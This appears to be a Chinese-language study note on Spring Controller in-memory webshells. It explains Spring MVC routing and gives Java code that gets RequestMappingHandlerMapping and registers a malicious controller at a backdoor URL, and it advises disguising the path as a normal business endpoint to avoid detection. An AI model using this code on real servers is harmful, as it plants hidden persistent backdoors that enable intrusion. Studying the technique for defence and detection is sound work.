---
title: 
description: 
tags: []
status: 
finish-date: 
difficulty: 
---

# SpringController型内存马

## 为什么需要 Spring Controller 型内存马
>Filter/Listener/Servlet 型都是容器层面的内存马，寄生在 Tomcat 的 StandardContext 中。
>
>但在实际生产环境中，绝大多数 Java Web 应用都使用 Spring 框架。在 Spring 环境下，应用的主要入口是 @Controller 或 @RestController 类，而不是直接操作 Servlet。

**Spring Controller 型内存马的优势**：

- 与业务代码高度融合，难以区分

- 不依赖特定容器（Tomcat/Jetty/WebLogic 都支持）

- 更贴合 Spring 应用的运行机制

## Spring 请求处理的核心组件
**处理流程**

```
用户请求 /hello
    ↓
DispatcherServlet（前端控制器）
    ↓
HandlerMapping（查找能处理该请求的 Controller）
    ↓
HandlerAdapter（执行 Controller 方法）
    ↓
Controller 方法返回结果
    ↓
ViewResolver 渲染视图
```

**核心对象：RequestMappingHandlerMapping**

`RequestMappingHandlerMapping handlerMapping = 
    context.getBean(RequestMappingHandlerMapping.class);`

这个对象负责维护 URL → Controller 方法 的映射关系。我们的内存马就是通过动态修改这个映射表来植入后门的。

- RequestMappingHandlerMapping 是 Spring MVC 的核心组件，负责维护所有 @RequestMapping 注解的路由映射。

- 它内部有一个大 Map，结构类似于：
  
  ```
    Map<RequestMappingInfo, HandlerMethod> mappingRegistry = {
    {paths="/hello", method=GET} → HandlerMethod(HelloController, hello()),
    {paths="/user", method=POST} → HandlerMethod(UserController, create())
    }
  ```

- registerMapping() 就是把我们的恶意 mappingInfo 和 HandlerMethod(controllerInstance, method) 添加到这个 Map 里。

## Spring Controller 型内存马的核心思路
>利用代码执行入口，在运行时获取 Spring 的 RequestMappingHandlerMapping，动态注册一个新的 Controller 方法，并绑定到一个指定的 URL 上，使其成为 Spring 应用中的一个正常接口。

| 类型 | 操作台 | 注册对象 |
|------|--------|----------|
| Filter 型 | StandardContext | Filter |
| Listener 型 | StandardContext | ServletRequestListener |
| Servlet 型 | StandardContext | HttpServlet |
| Spring Controller 型 | RequestMappingHandlerMapping | @Controller 方法 |

## Controller 的注册过程
**正常写法**
```java
@RestController
public class HelloController {
    @GetMapping("/hello")
    public String hello(@RequestParam String name) {
        return "Hello, " + name + "!";
    }
}
```
Spring 启动时，会扫描所有带有 @Controller 或 @RestController 的类，将它们的 @RequestMapping 方法注册到 RequestMappingHandlerMapping 中。

**动态注册（内存马方式）**

```java
RequestMappingInfo mappingInfo =RequestMappingInfo.path("/backdoor").methods(RequestMethod.GET).build();
//构建路由规则
//告诉Spring，如果有人用GET方法访问/backdoor就交给恶意Controller方法
handlerMapping.registerMapping(mappingInfo,controllerInstance,method
);
//把路由规则挂到 Spring 的“路由表”上
```

- RequestMappingInfo Spring内部用来存储路由规则的对象，包含路径，HTTP方法，参数，请求头等

- RequestMappingInfo.path("/backdoor") 静态方法，开始构建一个规则指定URL路径为/backdoor

- .methods(RequestMethod.GET) 链式调用，添加限制条件只匹配GET请求

- .build(); 方法调用，完成构建生成一个不可变RequestMappingInfo对象

*关键注意事项*

| 事项 | 说明 |
|------|------|
| `paths()` 可以传多个路径 | 例如 `.paths("/backdoor", "/admin/backdoor")`，绑定多个入口 |
| `methods()` 可以传多个方法 | 例如 `.methods(RequestMethod.GET, RequestMethod.POST)` |
| `controllerInstance` 必须是对象 | 不能传类，必须是 `new EvilController()` 的实例 |
| `method` 必须是 `public` 方法 | 否则 `getMethod()` 会找不到 |

## Spring Controller 型内存马的完整流程
1. **构造恶意Controller方法**

2. **获取RequestMappingHandlerMapping**（

    - 从 request 中获取 Spring 上下文

    - 通过 @Autowired 注入（适用于 Spring Boot 环境）

3. **完整注入代码**
   ```java
    // 1. 获取 Spring 上下文
    WebApplicationContext context = (WebApplicationContext) 
        request.getServletContext()
            .getAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);

    RequestMappingHandlerMapping handlerMapping = 
        context.getBean(RequestMappingHandlerMapping.class);

    // 2. 获取恶意方法
    Method method = EvilController.class.getMethod(
        "evilMethod", 
        HttpServletRequest.class, 
        HttpServletResponse.class
    );

    // 3. 创建映射信息
    RequestMappingInfo mappingInfo = RequestMappingInfo
        .paths("/spring_backdoor")
        .methods(RequestMethod.GET)
        .build();

    // 4. 注册到 HandlerMapping
    Object controllerInstance = new EvilController();
    handlerMapping.registerMapping(mappingInfo, controllerInstance, method);
   ``` 
### 详解
**定义恶意类Controller**

**获取操作台Spring上下文**
```java
WebApplicationContext context = (WebApplicationContext) request.getServletContext()
    .getAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);
```
- 它是什么：WebApplicationContext 是 Spring 的核心容器，里面管理着所有的 Bean（比如我们后面要用到的 HandlerMapping）。

- 怎么拿到的：在 Spring Boot 中，启动时会把 WebApplicationContext 以固定属性名 ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE 存入 ServletContext。我们通过当前请求的 request 对象

**找到路由管理器RequestMappingHandlerMapping**
```java
RequestMappingHandlerMapping handlerMapping = 
    context.getBean(RequestMappingHandlerMapping.class);
```

- 它是什么：RequestMappingHandlerMapping 是 Spring MVC 的核心路由表，它维护了所有 @RequestMapping 注解（比如 @GetMapping）的 URL 与对应方法的映射关系。

- 怎么拿到的：直接从 Spring 容器中通过 getBean 方法获取。拿到它，我们就拿到了整个应用的“路由控制权”。

**注册恶意路由**
```java
// 1. 获取恶意方法对象
Method method = EvilController.class.getMethod("evilMethod", 
    HttpServletRequest.class, HttpServletResponse.class);

// 2. 构建映射规则
RequestMappingInfo mappingInfo = RequestMappingInfo
    .paths("/spring_backdoor")
    .methods(RequestMethod.GET)
    .build();

// 3. 注册到 Spring 路由表
handlerMapping.registerMapping(mappingInfo, new EvilController(), method);
```

- 通过反射获取 EvilController 类中的 evilMethod 方法对象。我们不是直接调用，而是把它作为“处理函数”注册给 Spring。

- 构建一个路由规则 RequestMappingInfo，告诉 Spring：“当用户以 GET 方式访问 /spring_backdoor 时，用这个方法处理”。

- 最关键的一步！调用 handlerMapping.registerMapping()，把我们构造好的“规则”和“方法”强行写入 Spring 的核心路由表中。
  

**完整PoC**

[](../../../code-attachment/memory-shell-code/minidemo/Spring-Controller.jsp)

  
## 与 Filter 型内存马的关键差异

| 维度 | Filter 型 | Spring Controller 型 |
|------|----------|----------------------|
| 操作对象 | Tomcat StandardContext | Spring RequestMappingHandlerMapping |
| 注册方式 | `addFilterDef()` + `addFilterMap()` | `registerMapping()` |
| 触发方式 | 访问特定 URL | 访问特定 URL |
| 依赖 | 依赖 Tomcat | 依赖 Spring 框架 |
| 隐蔽性 | 中高 | 更高（与业务代码高度融合） |
| 检测难度 | 中 | 高 |
| 适用范围 | 所有 Java Web 容器 | 仅 Spring 应用 |

## Spring Controller 型内存马的优缺点
**优势**

- 与业务代码融合	在大量正常的 Controller 中，很难发现异常

- 不依赖容器	适用于 Tomcat、Jetty、WebLogic 等所有支持 Spring 的容器

- 自然回显	不像 Listener 那样需要额外处理回显

- 访问日志难以识别	路径可以伪装成正常业务接口（如 /admin/status）

**局限性**

- 需要 Spring 环境	如果目标应用不使用 Spring，则此方法无效

- 需要获取 HandlerMapping	在某些 Spring 版本中，Bean 名称可能不同

- RASP 检测	现代 RASP 会监控 registerMapping 的调用
## 总结
>Spring Controller 型内存马的本质是：利用代码执行入口，获取 Spring 的 RequestMappingHandlerMapping，在运行时动态注册一个恶意 Controller 方法并绑定到指定 URL，使其融入 Spring 应用的正常请求处理流程，实现无文件后门。

| 要点 | 说明 |
|------|------|
| 获取上下文 | 从 `request.getServletContext()` 或 `WebApplicationContextUtils` 获取 |
| 获取 HandlerMapping | `context.getBean(RequestMappingHandlerMapping.class)` |
| 注册方法 | `handlerMapping.registerMapping(mappingInfo, controller, method)` |
| 路径选择 | 尽量伪装成正常业务路径（如 `/api/status`、`/admin/health`） |
| 版本兼容 | Spring 4.x 和 5.x 的 API 基本一致 |


